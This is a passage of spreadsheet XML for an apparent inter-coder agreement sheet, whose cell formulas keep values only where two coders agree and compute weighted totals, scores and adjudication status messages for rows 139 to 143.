        <f>IF(AND(Coder1!J139&amp;""&lt;&gt;"",Coder1!J139&amp;""=Coder2!J139&amp;""),Coder1!J139,"")</f>
        <v/>
      </c>
      <c r="K139" s="14">
        <f>IF(AND(Coder1!K139&amp;""&lt;&gt;"",Coder1!K139&amp;""=Coder2!K139&amp;""),Coder1!K139,"")</f>
        <v/>
      </c>
      <c r="L139" s="14">
        <f>IF(AND(Coder1!L139&amp;""&lt;&gt;"",Coder1!L139&amp;""=Coder2!L139&amp;""),Coder1!L139,"")</f>
        <v/>
      </c>
      <c r="M139" s="14">
        <f>IF(AND(Coder1!M139&amp;""&lt;&gt;"",Coder1!M139&amp;""=Coder2!M139&amp;""),Coder1!M139,"")</f>
        <v/>
      </c>
      <c r="N139" s="14">
        <f>IF(AND(Coder1!N139&amp;""&lt;&gt;"",Coder1!N139&amp;""=Coder2!N139&amp;""),Coder1!N139,"")</f>
        <v/>
      </c>
      <c r="O139" s="14">
        <f>IF(AND(Coder1!O139&amp;""&lt;&gt;"",Coder1!O139&amp;""=Coder2!O139&amp;""),Coder1!O139,"")</f>
        <v/>
      </c>
      <c r="P139" s="14">
        <f>IF(AND(Coder1!P139&amp;""&lt;&gt;"",Coder1!P139&amp;""=Coder2!P139&amp;""),Coder1!P139,"")</f>
        <v/>
      </c>
      <c r="Q139" s="14">
        <f>IF(AND(Coder1!Q139&amp;""&lt;&gt;"",Coder1!Q139&amp;""=Coder2!Q139&amp;""),Coder1!Q139,"")</f>
        <v/>
      </c>
      <c r="R139" s="14">
        <f>IF(AND(Coder1!R139&amp;""&lt;&gt;"",Coder1!R139&amp;""=Coder2!R139&amp;""),Coder1!R139,"")</f>
        <v/>
      </c>
      <c r="S139" s="14">
        <f>IF(AND(Coder1!S139&amp;""&lt;&gt;"",Coder1!S139&amp;""=Coder2!S139&amp;""),Coder1!S139,"")</f>
        <v/>
      </c>
      <c r="T139" s="14">
        <f>IF(AND(Coder1!T139&amp;""&lt;&gt;"",Coder1!T139&amp;""=Coder2!T139&amp;""),Coder1!T139,"")</f>
        <v/>
      </c>
      <c r="U139" s="14">
        <f>IF(AND(Coder1!U139&amp;""&lt;&gt;"",Coder1!U139&amp;""=Coder2!U139&amp;""),Coder1!U139,"")</f>
        <v/>
      </c>
      <c r="V139" s="14">
        <f>IF(AND(Coder1!V139&amp;""&lt;&gt;"",Coder1!V139&amp;""=Coder2!V139&amp;""),Coder1!V139,"")</f>
        <v/>
      </c>
      <c r="W139" s="14">
        <f>IF(AND(Coder1!W139&amp;""&lt;&gt;"",Coder1!W139&amp;""=Coder2!W139&amp;""),Coder1!W139,"")</f>
        <v/>
      </c>
      <c r="X139" s="14">
        <f>IF(AND(Coder1!X139&amp;""&lt;&gt;"",Coder1!X139&amp;""=Coder2!X139&amp;""),Coder1!X139,"")</f>
        <v/>
      </c>
      <c r="Y139" s="14">
        <f>IF(AND(Coder1!Y139&amp;""&lt;&gt;"",Coder1!Y139&amp;""=Coder2!Y139&amp;""),Coder1!Y139,"")</f>
        <v/>
      </c>
      <c r="Z139" s="14">
        <f>IF(AND(Coder1!Z139&amp;""&lt;&gt;"",Coder1!Z139&amp;""=Coder2!Z139&amp;""),Coder1!Z139,"")</f>
        <v/>
      </c>
      <c r="AA139" s="14">
        <f>IF(AND(Coder1!AA139&amp;""&lt;&gt;"",Coder1!AA139&amp;""=Coder2!AA139&amp;""),Coder1!AA139,"")</f>
        <v/>
      </c>
      <c r="AB139" s="14">
        <f>IF(AND(Coder1!AB139&amp;""&lt;&gt;"",Coder1!AB139&amp;""=Coder2!AB139&amp;""),Coder1!AB139,"")</f>
        <v/>
      </c>
      <c r="AC139" s="14">
        <f>IF(AND(Coder1!AC139&amp;""&lt;&gt;"",Coder1!AC139&amp;""=Coder2!AC139&amp;""),Coder1!AC139,"")</f>
        <v/>
      </c>
      <c r="AD139" s="14">
        <f>IF(AND(Coder1!AD139&amp;""&lt;&gt;"",Coder1!AD139&amp;""=Coder2!AD139&amp;""),Coder1!AD139,"")</f>
        <v/>
      </c>
      <c r="AE139" s="14">
        <f>IF(AND(Coder1!AE139&amp;""&lt;&gt;"",Coder1!AE139&amp;""=Coder2!AE139&amp;""),Coder1!AE139,"")</f>
        <v/>
      </c>
      <c r="AF139" s="14">
        <f>IF(AND(Coder1!AF139&amp;""&lt;&gt;"",Coder1!AF139&amp;""=Coder2!AF139&amp;""),Coder1!AF139,"")</f>
        <v/>
      </c>
      <c r="AG139" s="14">
        <f>IF(AND(Coder1!AG139&amp;""&lt;&gt;"",Coder1!AG139&amp;""=Coder2!AG139&amp;""),Coder1!AG139,"")</f>
        <v/>
      </c>
      <c r="AH139" s="14">
        <f>IF(AND(Coder1!AH139&amp;""&lt;&gt;"",Coder1!AH139&amp;""=Coder2!AH139&amp;""),Coder1!AH139,"")</f>
        <v/>
      </c>
      <c r="AI139" s="11">
        <f>IF(COUNT(E139:L139)=0,"",SUM(E139:L139))</f>
        <v/>
      </c>
      <c r="AJ139" s="11">
        <f>IF(AI139="","",N(E139)*3+N(F139)*2+N(G139)*2+N(H139)*2+N(I139)*2+N(J139)*3+N(K139)*3+N(L139)*3)</f>
        <v/>
      </c>
      <c r="AK139" s="11">
        <f>IF(AI139="","",COUNTIF(N139:AG139,1))</f>
        <v/>
      </c>
      <c r="AL139" s="11">
        <f>IF(OR(AJ139="",AJ139=0),"",ROUND(100*(AJ139-AK139)/AJ139,1))</f>
        <v/>
      </c>
      <c r="AM139" s="11">
        <f>IF(AND(Coder1!AN139=1,Coder2!AN139=1),IF(COUNTBLANK(E139:AH139)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN139" s="11">
        <f>IF(AND(Coder1!AN139=1,Coder2!AN139=1),IF(SUMPRODUCT(--(Coder1!E139:AH139&amp;""&lt;&gt;Coder2!E139:AH139&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO139" s="11" t="n"/>
    </row>
    <row r="140">
      <c r="A140" s="11">
        <f>Coder1!A140</f>
        <v/>
      </c>
      <c r="B140" s="11">
        <f>Coder1!B140</f>
        <v/>
      </c>
      <c r="C140" s="11">
        <f>Coder1!C140</f>
        <v/>
      </c>
      <c r="D140" s="11">
        <f>Coder1!D140</f>
        <v/>
      </c>
      <c r="E140" s="14">
        <f>IF(AND(Coder1!E140&amp;""&lt;&gt;"",Coder1!E140&amp;""=Coder2!E140&amp;""),Coder1!E140,"")</f>
        <v/>
      </c>
      <c r="F140" s="14">
        <f>IF(AND(Coder1!F140&amp;""&lt;&gt;"",Coder1!F140&amp;""=Coder2!F140&amp;""),Coder1!F140,"")</f>
        <v/>
      </c>
      <c r="G140" s="14">
        <f>IF(AND(Coder1!G140&amp;""&lt;&gt;"",Coder1!G140&amp;""=Coder2!G140&amp;""),Coder1!G140,"")</f>
        <v/>
      </c>
      <c r="H140" s="14">
        <f>IF(AND(Coder1!H140&amp;""&lt;&gt;"",Coder1!H140&amp;""=Coder2!H140&amp;""),Coder1!H140,"")</f>
        <v/>
      </c>
      <c r="I140" s="14">
        <f>IF(AND(Coder1!I140&amp;""&lt;&gt;"",Coder1!I140&amp;""=Coder2!I140&amp;""),Coder1!I140,"")</f>
        <v/>
      </c>
      <c r="J140" s="14">
        <f>IF(AND(Coder1!J140&amp;""&lt;&gt;"",Coder1!J140&amp;""=Coder2!J140&amp;""),Coder1!J140,"")</f>
        <v/>
      </c>
      <c r="K140" s="14">
        <f>IF(AND(Coder1!K140&amp;""&lt;&gt;"",Coder1!K140&amp;""=Coder2!K140&amp;""),Coder1!K140,"")</f>
        <v/>
      </c>
      <c r="L140" s="14">
        <f>IF(AND(Coder1!L140&amp;""&lt;&gt;"",Coder1!L140&amp;""=Coder2!L140&amp;""),Coder1!L140,"")</f>
        <v/>
      </c>
      <c r="M140" s="14">
        <f>IF(AND(Coder1!M140&amp;""&lt;&gt;"",Coder1!M140&amp;""=Coder2!M140&amp;""),Coder1!M140,"")</f>
        <v/>
      </c>
      <c r="N140" s="14">
        <f>IF(AND(Coder1!N140&amp;""&lt;&gt;"",Coder1!N140&amp;""=Coder2!N140&amp;""),Coder1!N140,"")</f>
        <v/>
      </c>
      <c r="O140" s="14">
        <f>IF(AND(Coder1!O140&amp;""&lt;&gt;"",Coder1!O140&amp;""=Coder2!O140&amp;""),Coder1!O140,"")</f>
        <v/>
      </c>
      <c r="P140" s="14">
        <f>IF(AND(Coder1!P140&amp;""&lt;&gt;"",Coder1!P140&amp;""=Coder2!P140&amp;""),Coder1!P140,"")</f>
        <v/>
      </c>
      <c r="Q140" s="14">
        <f>IF(AND(Coder1!Q140&amp;""&lt;&gt;"",Coder1!Q140&amp;""=Coder2!Q140&amp;""),Coder1!Q140,"")</f>
        <v/>
      </c>
      <c r="R140" s="14">
        <f>IF(AND(Coder1!R140&amp;""&lt;&gt;"",Coder1!R140&amp;""=Coder2!R140&amp;""),Coder1!R140,"")</f>
        <v/>
      </c>
      <c r="S140" s="14">
        <f>IF(AND(Coder1!S140&amp;""&lt;&gt;"",Coder1!S140&amp;""=Coder2!S140&amp;""),Coder1!S140,"")</f>
        <v/>
      </c>
      <c r="T140" s="14">
        <f>IF(AND(Coder1!T140&amp;""&lt;&gt;"",Coder1!T140&amp;""=Coder2!T140&amp;""),Coder1!T140,"")</f>
        <v/>
      </c>
      <c r="U140" s="14">
        <f>IF(AND(Coder1!U140&amp;""&lt;&gt;"",Coder1!U140&amp;""=Coder2!U140&amp;""),Coder1!U140,"")</f>
        <v/>
      </c>
      <c r="V140" s="14">
        <f>IF(AND(Coder1!V140&amp;""&lt;&gt;"",Coder1!V140&amp;""=Coder2!V140&amp;""),Coder1!V140,"")</f>
        <v/>
      </c>
      <c r="W140" s="14">
        <f>IF(AND(Coder1!W140&amp;""&lt;&gt;"",Coder1!W140&amp;""=Coder2!W140&amp;""),Coder1!W140,"")</f>
        <v/>
      </c>
      <c r="X140" s="14">
        <f>IF(AND(Coder1!X140&amp;""&lt;&gt;"",Coder1!X140&amp;""=Coder2!X140&amp;""),Coder1!X140,"")</f>
        <v/>
      </c>
      <c r="Y140" s="14">
        <f>IF(AND(Coder1!Y140&amp;""&lt;&gt;"",Coder1!Y140&amp;""=Coder2!Y140&amp;""),Coder1!Y140,"")</f>
        <v/>
      </c>
      <c r="Z140" s="14">
        <f>IF(AND(Coder1!Z140&amp;""&lt;&gt;"",Coder1!Z140&amp;""=Coder2!Z140&amp;""),Coder1!Z140,"")</f>
        <v/>
      </c>
      <c r="AA140" s="14">
        <f>IF(AND(Coder1!AA140&amp;""&lt;&gt;"",Coder1!AA140&amp;""=Coder2!AA140&amp;""),Coder1!AA140,"")</f>
        <v/>
      </c>
      <c r="AB140" s="14">
        <f>IF(AND(Coder1!AB140&amp;""&lt;&gt;"",Coder1!AB140&amp;""=Coder2!AB140&amp;""),Coder1!AB140,"")</f>
        <v/>
      </c>
      <c r="AC140" s="14">
        <f>IF(AND(Coder1!AC140&amp;""&lt;&gt;"",Coder1!AC140&amp;""=Coder2!AC140&amp;""),Coder1!AC140,"")</f>
        <v/>
      </c>
      <c r="AD140" s="14">
        <f>IF(AND(Coder1!AD140&amp;""&lt;&gt;"",Coder1!AD140&amp;""=Coder2!AD140&amp;""),Coder1!AD140,"")</f>
        <v/>
      </c>
      <c r="AE140" s="14">
        <f>IF(AND(Coder1!AE140&amp;""&lt;&gt;"",Coder1!AE140&amp;""=Coder2!AE140&amp;""),Coder1!AE140,"")</f>
        <v/>
      </c>
      <c r="AF140" s="14">
        <f>IF(AND(Coder1!AF140&amp;""&lt;&gt;"",Coder1!AF140&amp;""=Coder2!AF140&amp;""),Coder1!AF140,"")</f>
        <v/>
      </c>
      <c r="AG140" s="14">
        <f>IF(AND(Coder1!AG140&amp;""&lt;&gt;"",Coder1!AG140&amp;""=Coder2!AG140&amp;""),Coder1!AG140,"")</f>
        <v/>
      </c>
      <c r="AH140" s="14">
        <f>IF(AND(Coder1!AH140&amp;""&lt;&gt;"",Coder1!AH140&amp;""=Coder2!AH140&amp;""),Coder1!AH140,"")</f>
        <v/>
      </c>
      <c r="AI140" s="11">
        <f>IF(COUNT(E140:L140)=0,"",SUM(E140:L140))</f>
        <v/>
      </c>
      <c r="AJ140" s="11">
        <f>IF(AI140="","",N(E140)*3+N(F140)*2+N(G140)*2+N(H140)*2+N(I140)*2+N(J140)*3+N(K140)*3+N(L140)*3)</f>
        <v/>
      </c>
      <c r="AK140" s="11">
        <f>IF(AI140="","",COUNTIF(N140:AG140,1))</f>
        <v/>
      </c>
      <c r="AL140" s="11">
        <f>IF(OR(AJ140="",AJ140=0),"",ROUND(100*(AJ140-AK140)/AJ140,1))</f>
        <v/>
      </c>
      <c r="AM140" s="11">
        <f>IF(AND(Coder1!AN140=1,Coder2!AN140=1),IF(COUNTBLANK(E140:AH140)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN140" s="11">
        <f>IF(AND(Coder1!AN140=1,Coder2!AN140=1),IF(SUMPRODUCT(--(Coder1!E140:AH140&amp;""&lt;&gt;Coder2!E140:AH140&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO140" s="11" t="n"/>
    </row>
    <row r="141">
      <c r="A141" s="11">
        <f>Coder1!A141</f>
        <v/>
      </c>
      <c r="B141" s="11">
        <f>Coder1!B141</f>
        <v/>
      </c>
      <c r="C141" s="11">
        <f>Coder1!C141</f>
        <v/>
      </c>
      <c r="D141" s="11">
        <f>Coder1!D141</f>
        <v/>
      </c>
      <c r="E141" s="14">
        <f>IF(AND(Coder1!E141&amp;""&lt;&gt;"",Coder1!E141&amp;""=Coder2!E141&amp;""),Coder1!E141,"")</f>
        <v/>
      </c>
      <c r="F141" s="14">
        <f>IF(AND(Coder1!F141&amp;""&lt;&gt;"",Coder1!F141&amp;""=Coder2!F141&amp;""),Coder1!F141,"")</f>
        <v/>
      </c>
      <c r="G141" s="14">
        <f>IF(AND(Coder1!G141&amp;""&lt;&gt;"",Coder1!G141&amp;""=Coder2!G141&amp;""),Coder1!G141,"")</f>
        <v/>
      </c>
      <c r="H141" s="14">
        <f>IF(AND(Coder1!H141&amp;""&lt;&gt;"",Coder1!H141&amp;""=Coder2!H141&amp;""),Coder1!H141,"")</f>
        <v/>
      </c>
      <c r="I141" s="14">
        <f>IF(AND(Coder1!I141&amp;""&lt;&gt;"",Coder1!I141&amp;""=Coder2!I141&amp;""),Coder1!I141,"")</f>
        <v/>
      </c>
      <c r="J141" s="14">
        <f>IF(AND(Coder1!J141&amp;""&lt;&gt;"",Coder1!J141&amp;""=Coder2!J141&amp;""),Coder1!J141,"")</f>
        <v/>
      </c>
      <c r="K141" s="14">
        <f>IF(AND(Coder1!K141&amp;""&lt;&gt;"",Coder1!K141&amp;""=Coder2!K141&amp;""),Coder1!K141,"")</f>
        <v/>
      </c>
      <c r="L141" s="14">
        <f>IF(AND(Coder1!L141&amp;""&lt;&gt;"",Coder1!L141&amp;""=Coder2!L141&amp;""),Coder1!L141,"")</f>
        <v/>
      </c>
      <c r="M141" s="14">
        <f>IF(AND(Coder1!M141&amp;""&lt;&gt;"",Coder1!M141&amp;""=Coder2!M141&amp;""),Coder1!M141,"")</f>
        <v/>
      </c>
      <c r="N141" s="14">
        <f>IF(AND(Coder1!N141&amp;""&lt;&gt;"",Coder1!N141&amp;""=Coder2!N141&amp;""),Coder1!N141,"")</f>
        <v/>
      </c>
      <c r="O141" s="14">
        <f>IF(AND(Coder1!O141&amp;""&lt;&gt;"",Coder1!O141&amp;""=Coder2!O141&amp;""),Coder1!O141,"")</f>
        <v/>
      </c>
      <c r="P141" s="14">
        <f>IF(AND(Coder1!P141&amp;""&lt;&gt;"",Coder1!P141&amp;""=Coder2!P141&amp;""),Coder1!P141,"")</f>
        <v/>
      </c>
      <c r="Q141" s="14">
        <f>IF(AND(Coder1!Q141&amp;""&lt;&gt;"",Coder1!Q141&amp;""=Coder2!Q141&amp;""),Coder1!Q141,"")</f>
        <v/>
      </c>
      <c r="R141" s="14">
        <f>IF(AND(Coder1!R141&amp;""&lt;&gt;"",Coder1!R141&amp;""=Coder2!R141&amp;""),Coder1!R141,"")</f>
        <v/>
      </c>
      <c r="S141" s="14">
        <f>IF(AND(Coder1!S141&amp;""&lt;&gt;"",Coder1!S141&amp;""=Coder2!S141&amp;""),Coder1!S141,"")</f>
        <v/>
      </c>
      <c r="T141" s="14">
        <f>IF(AND(Coder1!T141&amp;""&lt;&gt;"",Coder1!T141&amp;""=Coder2!T141&amp;""),Coder1!T141,"")</f>
        <v/>
      </c>
      <c r="U141" s="14">
        <f>IF(AND(Coder1!U141&amp;""&lt;&gt;"",Coder1!U141&amp;""=Coder2!U141&amp;""),Coder1!U141,"")</f>
        <v/>
      </c>
      <c r="V141" s="14">
        <f>IF(AND(Coder1!V141&amp;""&lt;&gt;"",Coder1!V141&amp;""=Coder2!V141&amp;""),Coder1!V141,"")</f>
        <v/>
      </c>
      <c r="W141" s="14">
        <f>IF(AND(Coder1!W141&amp;""&lt;&gt;"",Coder1!W141&amp;""=Coder2!W141&amp;""),Coder1!W141,"")</f>
        <v/>
      </c>
      <c r="X141" s="14">
        <f>IF(AND(Coder1!X141&amp;""&lt;&gt;"",Coder1!X141&amp;""=Coder2!X141&amp;""),Coder1!X141,"")</f>
        <v/>
      </c>
      <c r="Y141" s="14">
        <f>IF(AND(Coder1!Y141&amp;""&lt;&gt;"",Coder1!Y141&amp;""=Coder2!Y141&amp;""),Coder1!Y141,"")</f>
        <v/>
      </c>
      <c r="Z141" s="14">
        <f>IF(AND(Coder1!Z141&amp;""&lt;&gt;"",Coder1!Z141&amp;""=Coder2!Z141&amp;""),Coder1!Z141,"")</f>
        <v/>
      </c>
      <c r="AA141" s="14">
        <f>IF(AND(Coder1!AA141&amp;""&lt;&gt;"",Coder1!AA141&amp;""=Coder2!AA141&amp;""),Coder1!AA141,"")</f>
        <v/>
      </c>
      <c r="AB141" s="14">
        <f>IF(AND(Coder1!AB141&amp;""&lt;&gt;"",Coder1!AB141&amp;""=Coder2!AB141&amp;""),Coder1!AB141,"")</f>
        <v/>
      </c>
      <c r="AC141" s="14">
        <f>IF(AND(Coder1!AC141&amp;""&lt;&gt;"",Coder1!AC141&amp;""=Coder2!AC141&amp;""),Coder1!AC141,"")</f>
        <v/>
      </c>
      <c r="AD141" s="14">
        <f>IF(AND(Coder1!AD141&amp;""&lt;&gt;"",Coder1!AD141&amp;""=Coder2!AD141&amp;""),Coder1!AD141,"")</f>
        <v/>
      </c>
      <c r="AE141" s="14">
        <f>IF(AND(Coder1!AE141&amp;""&lt;&gt;"",Coder1!AE141&amp;""=Coder2!AE141&amp;""),Coder1!AE141,"")</f>
        <v/>
      </c>
      <c r="AF141" s="14">
        <f>IF(AND(Coder1!AF141&amp;""&lt;&gt;"",Coder1!AF141&amp;""=Coder2!AF141&amp;""),Coder1!AF141,"")</f>
        <v/>
      </c>
      <c r="AG141" s="14">
        <f>IF(AND(Coder1!AG141&amp;""&lt;&gt;"",Coder1!AG141&amp;""=Coder2!AG141&amp;""),Coder1!AG141,"")</f>
        <v/>
      </c>
      <c r="AH141" s="14">
        <f>IF(AND(Coder1!AH141&amp;""&lt;&gt;"",Coder1!AH141&amp;""=Coder2!AH141&amp;""),Coder1!AH141,"")</f>
        <v/>
      </c>
      <c r="AI141" s="11">
        <f>IF(COUNT(E141:L141)=0,"",SUM(E141:L141))</f>
        <v/>
      </c>
      <c r="AJ141" s="11">
        <f>IF(AI141="","",N(E141)*3+N(F141)*2+N(G141)*2+N(H141)*2+N(I141)*2+N(J141)*3+N(K141)*3+N(L141)*3)</f>
        <v/>
      </c>
      <c r="AK141" s="11">
        <f>IF(AI141="","",COUNTIF(N141:AG141,1))</f>
        <v/>
      </c>
      <c r="AL141" s="11">
        <f>IF(OR(AJ141="",AJ141=0),"",ROUND(100*(AJ141-AK141)/AJ141,1))</f>
        <v/>
      </c>
      <c r="AM141" s="11">
        <f>IF(AND(Coder1!AN141=1,Coder2!AN141=1),IF(COUNTBLANK(E141:AH141)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN141" s="11">
        <f>IF(AND(Coder1!AN141=1,Coder2!AN141=1),IF(SUMPRODUCT(--(Coder1!E141:AH141&amp;""&lt;&gt;Coder2!E141:AH141&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO141" s="11" t="n"/>
    </row>
    <row r="142">
      <c r="A142" s="11">
        <f>Coder1!A142</f>
        <v/>
      </c>
      <c r="B142" s="11">
        <f>Coder1!B142</f>
        <v/>
      </c>
      <c r="C142" s="11">
        <f>Coder1!C142</f>
        <v/>
      </c>
      <c r="D142" s="11">
        <f>Coder1!D142</f>
        <v/>
      </c>
      <c r="E142" s="14">
        <f>IF(AND(Coder1!E142&amp;""&lt;&gt;"",Coder1!E142&amp;""=Coder2!E142&amp;""),Coder1!E142,"")</f>
        <v/>
      </c>
      <c r="F142" s="14">
        <f>IF(AND(Coder1!F142&amp;""&lt;&gt;"",Coder1!F142&amp;""=Coder2!F142&amp;""),Coder1!F142,"")</f>
        <v/>
      </c>
      <c r="G142" s="14">
        <f>IF(AND(Coder1!G142&amp;""&lt;&gt;"",Coder1!G142&amp;""=Coder2!G142&amp;""),Coder1!G142,"")</f>
        <v/>
      </c>
      <c r="H142" s="14">
        <f>IF(AND(Coder1!H142&amp;""&lt;&gt;"",Coder1!H142&amp;""=Coder2!H142&amp;""),Coder1!H142,"")</f>
        <v/>
      </c>
      <c r="I142" s="14">
        <f>IF(AND(Coder1!I142&amp;""&lt;&gt;"",Coder1!I142&amp;""=Coder2!I142&amp;""),Coder1!I142,"")</f>
        <v/>
      </c>
      <c r="J142" s="14">
        <f>IF(AND(Coder1!J142&amp;""&lt;&gt;"",Coder1!J142&amp;""=Coder2!J142&amp;""),Coder1!J142,"")</f>
        <v/>
      </c>
      <c r="K142" s="14">
        <f>IF(AND(Coder1!K142&amp;""&lt;&gt;"",Coder1!K142&amp;""=Coder2!K142&amp;""),Coder1!K142,"")</f>
        <v/>
      </c>
      <c r="L142" s="14">
        <f>IF(AND(Coder1!L142&amp;""&lt;&gt;"",Coder1!L142&amp;""=Coder2!L142&amp;""),Coder1!L142,"")</f>
        <v/>
      </c>
      <c r="M142" s="14">
        <f>IF(AND(Coder1!M142&amp;""&lt;&gt;"",Coder1!M142&amp;""=Coder2!M142&amp;""),Coder1!M142,"")</f>
        <v/>
      </c>
      <c r="N142" s="14">
        <f>IF(AND(Coder1!N142&amp;""&lt;&gt;"",Coder1!N142&amp;""=Coder2!N142&amp;""),Coder1!N142,"")</f>
        <v/>
      </c>
      <c r="O142" s="14">
        <f>IF(AND(Coder1!O142&amp;""&lt;&gt;"",Coder1!O142&amp;""=Coder2!O142&amp;""),Coder1!O142,"")</f>
        <v/>
      </c>
      <c r="P142" s="14">
        <f>IF(AND(Coder1!P142&amp;""&lt;&gt;"",Coder1!P142&amp;""=Coder2!P142&amp;""),Coder1!P142,"")</f>
        <v/>
      </c>
      <c r="Q142" s="14">
        <f>IF(AND(Coder1!Q142&amp;""&lt;&gt;"",Coder1!Q142&amp;""=Coder2!Q142&amp;""),Coder1!Q142,"")</f>
        <v/>
      </c>
      <c r="R142" s="14">
        <f>IF(AND(Coder1!R142&amp;""&lt;&gt;"",Coder1!R142&amp;""=Coder2!R142&amp;""),Coder1!R142,"")</f>
        <v/>
      </c>
      <c r="S142" s="14">
        <f>IF(AND(Coder1!S142&amp;""&lt;&gt;"",Coder1!S142&amp;""=Coder2!S142&amp;""),Coder1!S142,"")</f>
        <v/>
      </c>
      <c r="T142" s="14">
        <f>IF(AND(Coder1!T142&amp;""&lt;&gt;"",Coder1!T142&amp;""=Coder2!T142&amp;""),Coder1!T142,"")</f>
        <v/>
      </c>
      <c r="U142" s="14">
        <f>IF(AND(Coder1!U142&amp;""&lt;&gt;"",Coder1!U142&amp;""=Coder2!U142&amp;""),Coder1!U142,"")</f>
        <v/>
      </c>
      <c r="V142" s="14">
        <f>IF(AND(Coder1!V142&amp;""&lt;&gt;"",Coder1!V142&amp;""=Coder2!V142&amp;""),Coder1!V142,"")</f>
        <v/>
      </c>
      <c r="W142" s="14">
        <f>IF(AND(Coder1!W142&amp;""&lt;&gt;"",Coder1!W142&amp;""=Coder2!W142&amp;""),Coder1!W142,"")</f>
        <v/>
      </c>
      <c r="X142" s="14">
        <f>IF(AND(Coder1!X142&amp;""&lt;&gt;"",Coder1!X142&amp;""=Coder2!X142&amp;""),Coder1!X142,"")</f>
        <v/>
      </c>
      <c r="Y142" s="14">
        <f>IF(AND(Coder1!Y142&amp;""&lt;&gt;"",Coder1!Y142&amp;""=Coder2!Y142&amp;""),Coder1!Y142,"")</f>
        <v/>
      </c>
      <c r="Z142" s="14">
        <f>IF(AND(Coder1!Z142&amp;""&lt;&gt;"",Coder1!Z142&amp;""=Coder2!Z142&amp;""),Coder1!Z142,"")</f>
        <v/>
      </c>
      <c r="AA142" s="14">
        <f>IF(AND(Coder1!AA142&amp;""&lt;&gt;"",Coder1!AA142&amp;""=Coder2!AA142&amp;""),Coder1!AA142,"")</f>
        <v/>
      </c>
      <c r="AB142" s="14">
        <f>IF(AND(Coder1!AB142&amp;""&lt;&gt;"",Coder1!AB142&amp;""=Coder2!AB142&amp;""),Coder1!AB142,"")</f>
        <v/>
      </c>
      <c r="AC142" s="14">
        <f>IF(AND(Coder1!AC142&amp;""&lt;&gt;"",Coder1!AC142&amp;""=Coder2!AC142&amp;""),Coder1!AC142,"")</f>
        <v/>
      </c>
      <c r="AD142" s="14">
        <f>IF(AND(Coder1!AD142&amp;""&lt;&gt;"",Coder1!AD142&amp;""=Coder2!AD142&amp;""),Coder1!AD142,"")</f>
        <v/>
      </c>
      <c r="AE142" s="14">
        <f>IF(AND(Coder1!AE142&amp;""&lt;&gt;"",Coder1!AE142&amp;""=Coder2!AE142&amp;""),Coder1!AE142,"")</f>
        <v/>
      </c>
      <c r="AF142" s="14">
        <f>IF(AND(Coder1!AF142&amp;""&lt;&gt;"",Coder1!AF142&amp;""=Coder2!AF142&amp;""),Coder1!AF142,"")</f>
        <v/>
      </c>
      <c r="AG142" s="14">
        <f>IF(AND(Coder1!AG142&amp;""&lt;&gt;"",Coder1!AG142&amp;""=Coder2!AG142&amp;""),Coder1!AG142,"")</f>
        <v/>
      </c>
      <c r="AH142" s="14">
        <f>IF(AND(Coder1!AH142&amp;""&lt;&gt;"",Coder1!AH142&amp;""=Coder2!AH142&amp;""),Coder1!AH142,"")</f>
        <v/>
      </c>
      <c r="AI142" s="11">
        <f>IF(COUNT(E142:L142)=0,"",SUM(E142:L142))</f>
        <v/>
      </c>
      <c r="AJ142" s="11">
        <f>IF(AI142="","",N(E142)*3+N(F142)*2+N(G142)*2+N(H142)*2+N(I142)*2+N(J142)*3+N(K142)*3+N(L142)*3)</f>
        <v/>
      </c>
      <c r="AK142" s="11">
        <f>IF(AI142="","",COUNTIF(N142:AG142,1))</f>
        <v/>
      </c>
      <c r="AL142" s="11">
        <f>IF(OR(AJ142="",AJ142=0),"",ROUND(100*(AJ142-AK142)/AJ142,1))</f>
        <v/>
      </c>
      <c r="AM142" s="11">
        <f>IF(AND(Coder1!AN142=1,Coder2!AN142=1),IF(COUNTBLANK(E142:AH142)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN142" s="11">
        <f>IF(AND(Coder1!AN142=1,Coder2!AN142=1),IF(SUMPRODUCT(--(Coder1!E142:AH142&amp;""&lt;&gt;Coder2!E142:AH142&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO142" s="11" t="n"/>
    </row>
    <row r="143">
      <c r="A143" s="11">
        <f>Coder1!A143</f>
        <v/>
      </c>
      <c r="B143" s="11">
        <f>Coder1!B143</f>
        <v/>
      </c>
      <c r="C143" s="11">
        <f>Coder1!C143</f>
        <v/>
      </c>
      <c r="D143" s="11">
        <f>Coder1!D143</f>
        <v/>
      </c>
      <c r="E143" s="14">
        <f>IF(AND(Coder1!E143&amp;""&lt;&gt;"",Coder1!E143&amp;""=Coder2!E143&amp;""),Coder1!E143,"")</f>
        <v/>
      </c>
      <c r="F143" s="14">
        <f>IF(AND(Coder1!F143&amp;""&lt;&gt;"",Coder1!F143&amp;""=Coder2!F143&amp;""),Coder1!F143,"")</f>
        <v/>
      </c>
      <c r="G143" s="14">
        <f>IF(AND(Coder1!G143&amp;""&lt;&gt;"",Coder1!G143&amp;""=Coder2!G143&amp;""),Coder1!G143,"")</f>
        <v/>
      </c>
      <c r="H143" s="14">
        <f>IF(AND(Coder1!H143&amp;""&lt;&gt;"",Coder1!H143&amp;""=Coder2!H143&amp;""),Coder1!H143,"")</f>
        <v/>
      </c>
      <c r="I143" s="14">
        <f>IF(AND(Coder1!I143&amp;""&lt;&gt;"",Coder1!I143&amp;""=Coder2!I143&amp;""),Coder1!I143,"")</f>
        <v/>
      </c>
      <c r="J143" s="14">
        <f>IF(AND(Coder1!J143&amp;""&lt;&gt;"",Coder1!J143&amp;""=Coder2!J143&amp;""),Coder1!J143,"")</f>
        <v/>
      </c>
      <c r="K143" s="14">
        <f>IF(AND(Coder1!K143&amp;""&lt;&gt;"",Coder1!K143&amp;""=Coder2!K143&amp;""),Coder1!K143,"")</f>
        <v/>
      </c>
      <c r="L143" s="14">
        <f>IF(AND(Coder1!L143&amp;""&lt;&gt;"",Coder1!L143&amp;""=Coder2!L143&amp;""),Coder1!L143,"")</f>
        <v/>
      </c>
      <c r="M143" s="14">
